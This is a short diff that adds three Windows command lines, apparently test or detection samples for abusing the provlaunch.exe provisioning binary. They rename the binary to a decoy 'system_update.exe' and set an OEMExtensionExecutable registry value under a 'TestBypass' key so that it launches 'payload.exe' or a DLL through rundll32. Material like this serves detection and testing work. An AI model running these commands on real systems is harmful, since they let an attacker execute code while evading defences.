@@ -1,0 +1,3 @@
+copy provlaunch.exe system_update.exe && system_update.exe
+reg add HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts\TestBypass /v OEMExtensionExecutable /t REG_SZ /d "payload.exe" /f && provlaunch.exe
+reg add HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts\TestBypass /v OEMExtensionExecutable /t REG_SZ /d "rundll32.exe Malicious.dll,EntryPoint" /f && provlaunch.exe
